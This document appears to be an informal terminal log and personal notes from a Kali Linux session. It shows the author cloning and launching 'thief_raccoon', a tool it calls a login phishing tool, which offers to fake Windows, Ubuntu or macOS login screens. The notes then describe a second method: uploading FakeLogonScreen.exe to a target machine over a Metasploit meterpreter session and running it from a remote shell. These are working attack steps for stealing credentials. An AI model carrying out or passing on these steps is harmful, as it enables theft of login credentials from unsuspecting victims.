                                                                                                                          ┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/davenisc/thief_raccoon.git
Cloning into 'thief_raccoon'...
remote: Enumerating objects: 70, done.
remote: Counting objects: 100% (70/70), done.
remote: Compressing objects: 100% (64/64), done.
remote: Total 70 (delta 34), reused 19 (delta 3), pack-reused 0 (from 0)
Receiving objects: 100% (70/70), 546.71 KiB | 1.34 MiB/s, done.
Resolving deltas: 100% (34/34), done.
                                                                             
┌──(kali㉿kali)-[~]
└─$ ls           
creds.json  Documents  ip.txt      Music       Pictures   thief_raccoon
creds.txt   Downloads  MaxPhisher  Net-strike  Public     Videos
Desktop     error.log  Media       Net-Strike  Templates  zphisher
                                                                             
┌──(kali㉿kali)-[~]
└─$ cd thief_raccoon
                                                                             
┌──(kali㉿kali)-[~/thief_raccoon]
└─$ python -m venv raccoon_venv
                                                                             
┌──(kali㉿kali)-[~/thief_raccoon]
└─$ source raccoon_venv/bin/activate
                                                                             
┌──(raccoon_venv)─(kali㉿kali)-[~/thief_raccoon]
└─$ 
┌──(raccoon_venv)─(kali㉿kali)-[~/thief_raccoon]
└─$ pip install -r requirements.txt
                                                                             
┌──(raccoon_venv)─(kali㉿kali)-[~/thief_raccoon]
└─$ pip install flask 

                                                      
┌──(raccoon_venv)─(kali㉿kali)-[~/thief_raccoon]
└─$ source raccoon_venv/bin/activate
                                                      
┌──(raccoon_venv)─(kali㉿kali)-[~/thief_raccoon]
└─$ pip install colorama
Collecting colorama
  Downloading colorama-0.4.6-py2.py3-none-any.whl.metadata (17 kB)
Downloading colorama-0.4.6-py2.py3-none-any.whl (25 kB)
Installing collected packages: colorama
Successfully installed colorama-0.4.6
                      

                                                                             
┌──(raccoon_venv)─(kali㉿kali)-[~/thief_raccoon]
└─$ python app.py       
/home/kali/thief_raccoon/app.py:21: SyntaxWarning: invalid escape sequence '\ '
  (_______) |   (_)        / __)  (_____ \

              ▄▄▄▄▄▄▄▄
 ▄█▀███▄▄████████████████████▄▄███▀█
 █░░▀████████████████████████████░░█
  █▄░░▀████████████████████████░░░▄▀
   ▀█▄▄████▀▀▀░░░░██░░░▀▀▀█████▄▄█▀
   ▄███▀▀░░░░░░░░░██░░░░░░░░░▀███▄
  ▄██▀░░░░░▄▄▄██▄▄██░▄██▄▄▄░░░░░▀██▄
▄██▀░░░▄▄▄███▄██████████▄███▄▄▄░░░▀█▄
▀██▄▄██████████▀░███▀▀▀█████████▄▄▄█▀
  ▀██████████▀░░░███░░░▀███████████▀
    ▀▀▀██████░░░█████▄░░▀██████▀▀         Versio: 1.0.0
         ▀▀▀▀▄░░█████▀░▄█▀▀▀              Dev: @davenisc
              ▀▀▄▄▄▄▄▀▀                   Web: https://davenisc.com
 _______ _     _          ___    ______                                    
(_______) |   (_)        / __)  (_____ \                                   
    _   | |__  _ _____ _| |__    _____) )_____  ____ ____ ___   ___  ____  
   | |  |  _ \| | ___ (_   __)  |  __  /(____ |/ ___) ___) _ \ / _ \|  _ \ 
   | |  | | | | | ____| | |     | |  \ \/ ___ ( (__( (__| |_| | |_| | | | |
   |_|  |_| |_|_|_____) |_|     |_|   |_\_____|\____)____)___/ \___/|_| |_|
                                                                           
       
thief raccoon - Herramienta para Phishing de inicio de sesion
    

Seleccione el sistema operativo para el phishing:
1. Windows 10
2. Windows 11                                                                
3. Windows XP                                                                
4. Windows Server                                                            
5. Ubuntu                                                                    
6. Ubuntu Server                                                             
7. macOS                                                                     
Ingrese el número de su elección:  





2nd way 


https://github.com/bitsadmin/fakelogonscreen

https://github.com/bitsadmin/fakelogonscreen/releases


install this file  
fakelogonscreen_trunk.zip 
 and extractthis 
than sr\tart metexploit/multi/handler

meterpreter >  pwd 
meterpreter >  upload ~/Downloads/facklogonscreen_trunk/FackeLogonScreen.exe

upload file on target 

meterpreter > dir

meterpreter > shell

c:/User\tony stark\Downloads>fakelogonscreen.exe

thats all



